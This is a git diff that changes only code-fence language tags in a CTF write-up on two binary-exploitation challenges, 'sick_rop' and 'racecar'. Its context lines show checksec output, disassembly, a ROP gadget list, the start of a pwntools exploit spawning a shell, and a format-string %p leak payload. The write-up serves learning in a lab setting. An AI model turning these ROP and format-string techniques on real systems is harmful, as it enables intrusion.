@@ -5,7 +5,7 @@ First I look what `file` are we dealing with and see that this one is statically
 
 Then I run checksec to see it's mitigations.
 
-```
+```bash
 └─$ checksec --file=sick_rop  
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY  Fortified  Fortifiable  FILE
 No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   10 Symbols        No     0          0            sick_rop
@@ -13,7 +13,7 @@ No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RU
 
 Spotting a buffer overflow immediately (the function puts 0x300 bytes on the stack but 0x20 bytes are reserved for our buffer.
 
-```
+```bash
 000000000040102e <vuln>:
   40102e:       55                      push   rbp
   40102f:       48 89 e5                mov    rbp,rsp
@@ -33,7 +33,7 @@ As the name of this challenge suggest, there might be some ROP gadget building f
 
 Checking the gadgets available for this challenge that we have (`read`, `write`, `syscall`, `ret`).
 
-```
+```bash
 0x0000000000401012 : and al, 0x10 ; syscall
 0x000000000040100d : and al, 8 ; mov rdx, qword ptr [rsp + 0x10] ; syscall
 0x0000000000401044 : call qword ptr [rax + 0x41]
@@ -67,7 +67,7 @@ This configuration will now call `vuln()` function, add 0x15 (that should be in 
 
 Adjusting correct offsets for overflowing the right bytes and then for the shellcode use `execve(/bin/bash)`
 
-```
+```python
 #!/usr/bin/env python3
 import sys
 from pwn import *
@@ -109,12 +109,12 @@ print(p.interactive())
 
 # racecar
 
-```
+```bash
 └─$ file racecar                                
 racecar: ELF 32-bit LSB pie executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped
 ```
 
-```
+```bash
 └─$ checksec --file=racecar         
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY  Fortified  Fortifiable  FILE
 Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   96 Symbols      No       0  	    3 		 racecar
@@ -122,7 +122,7 @@ Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RU
 
 Since all mitigations are enabled I am just looking for any leaks and I find `fgets`.
 
-```
+```c
 ...
 char buf[0x2c];
 fgets(&buf, 0x2c, fp);
@@ -134,7 +134,7 @@ There is a specific combination of inputs to reach this part of the code after r
 any, any, 2, 2, 1
 You need to create `flag.txt` locally to bypass the `if` above this code, then you are prompted with input for `fgets`. Here I leak pointer addresses with `%p` because the flag is on the stack.
 
-```
+```bash
 [!] Do you have anything to say to the press after your big victory?                                                
 >  %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
 
